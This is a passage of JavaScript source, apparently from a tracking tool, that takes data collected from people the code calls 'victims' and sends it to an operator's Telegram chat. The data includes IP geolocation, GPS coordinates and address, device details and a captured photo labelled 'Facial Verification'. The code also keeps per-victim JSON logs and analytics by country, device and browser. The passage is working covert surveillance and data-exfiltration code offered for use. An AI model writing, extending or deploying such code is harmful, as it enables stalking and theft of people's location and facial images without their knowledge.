            message += `🏙️ City: ${data.ipInfo.city || 'N/A'}\n`;
            message += `🏳️ Country: ${data.ipInfo.country_name || 'N/A'} (${data.ipInfo.country_code || 'N/A'})\n`;
            message += `🏢 ISP: ${data.ipInfo.org || 'N/A'}\n`;
        }
        
        message += `\n*📍 GPS Location:*\n`;
        if (data.location.lat) {
            message += `📡 Coordinates: ${data.location.lat}, ${data.location.lat}\n`;
            message += `🎯 Accuracy: ${data.location.accuracy}m\n`;
            message += `🗺️ Google Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n`;
            if (data.location.address) {
                message += `🏠 Address: ${JSON.stringify(data.location.address)}\n`;
            }
        } else {
            message += `❌ Location not available\n`;
        }
        
        message += `\n*🖥️ Device Info:*\n`;
        message += `💻 Browser: ${data.system.userAgent.split(' ')[0]}\n`;
        message += `🖥️ Screen: ${data.system.screen}\n`;
        message += `🌐 Language: ${data.system.language}\n`;
        message += `⏰ Timezone: ${data.system.timezone}\n`;
        
        message += `\n*📊 Network:*\n`;
        if (data.network.effectiveType) {
            message += `📶 Connection: ${data.network.effectiveType}\n`;
            message += `⚡ Speed: ${data.network.downlink || 'N/A'} Mbps\n`;
        }
        
        message += `\n*⏰ Timestamp:* ${new Date(data.timestamp).toLocaleString()}\n`;
        
        // Send text message
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // 2. Send location on map
        if (data.location.lat && data.location.lon) {
            await bot.sendLocation(CHAT_ID, data.location.lat, data.location.lon);
            
            // Send static map
            const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${data.location.lat},${data.location.lon}&zoom=15&size=600x300&markers=color:red%7C${data.location.lat},${data.location.lon}&key=YOUR_GOOGLE_MAPS_KEY`;
            await bot.sendPhoto(CHAT_ID, mapUrl);
        }
        
        // 3. Send photo if available
        if (data.photo) {
            try {
                // Convert base64 to buffer
                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
                const buffer = Buffer.from(base64Data, 'base64');
                
                // Send as photo
                await bot.sendPhoto(CHAT_ID, buffer, {
                    caption: '📸 Captured Photo - Facial Verification'
                });
            } catch (photoError) {
                console.error('Failed to send photo:', photoError);
            }
        }
        
        // 4. Send system details file
        const systemDetails = JSON.stringify(data, null, 2);
        await bot.sendDocument(CHAT_ID, Buffer.from(systemDetails), {
            filename: `victim_${data.victimId}_details.json`,
            caption: '📄 Complete Victim Details'
        });
        
    } catch (error) {
        console.error('Telegram send error:', error);
    }
}

// Helper Functions
function generateVictimId(req) {
    return require('crypto')
        .createHash('md5')
        .update(Date.now() + Math.random() + req.ip)
        .digest('hex')
        .substring(0, 12);
}

function updateAnalytics(data) {
    analytics.total++;
    
    // Check if within 24 hours
    const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
    if (new Date(data.timestamp).getTime() > oneDayAgo) {
        analytics.last24h++;
    }
    
    // Country
    if (data.ipInfo && data.ipInfo.country) {
        analytics.byCountry[data.ipInfo.country] = (analytics.byCountry[data.ipInfo.country] || 0) + 1;
    }
    
    // Device type
    const isMobile = /mobile/i.test(data.system.userAgent);
    const deviceType = isMobile ? 'Mobile' : 'Desktop';
    analytics.byDevice[deviceType] = (analytics.byDevice[deviceType] || 0) + 1;
    
    // Browser detection
    const ua = data.system.userAgent;
    let browser = 'Unknown';
    if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    else if (ua.includes('Edge')) browser = 'Edge';
    analytics.byBrowser[browser] = (analytics.byBrowser[browser] || 0) + 1;
    
    // Photos and locations
    if (data.photo) analytics.photosCaptured++;
    if (data.location.lat) analytics.locationsCaptured++;
}

function saveToTempFile(data) {
    // In Vercel, use /tmp directory for temporary files
    const tmpDir = '/tmp';
    if (!fs.existsSync(tmpDir)) {
        fs.mkdirSync(tmpDir, { recursive: true });
    }
    
    const filename = `${tmpDir}/victim_${data.victimId}_${Date.now()}.json`;
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    
    // Also append to master log
    const masterLog = `${tmpDir}/master_log.json`;
    let logs = [];
    if (fs.existsSync(masterLog)) {
        logs = JSON.parse(fs.readFileSync(masterLog));
    }
    logs.push(data);
    fs.writeFileSync(masterLog, JSON.stringify(logs, null, 2));
}

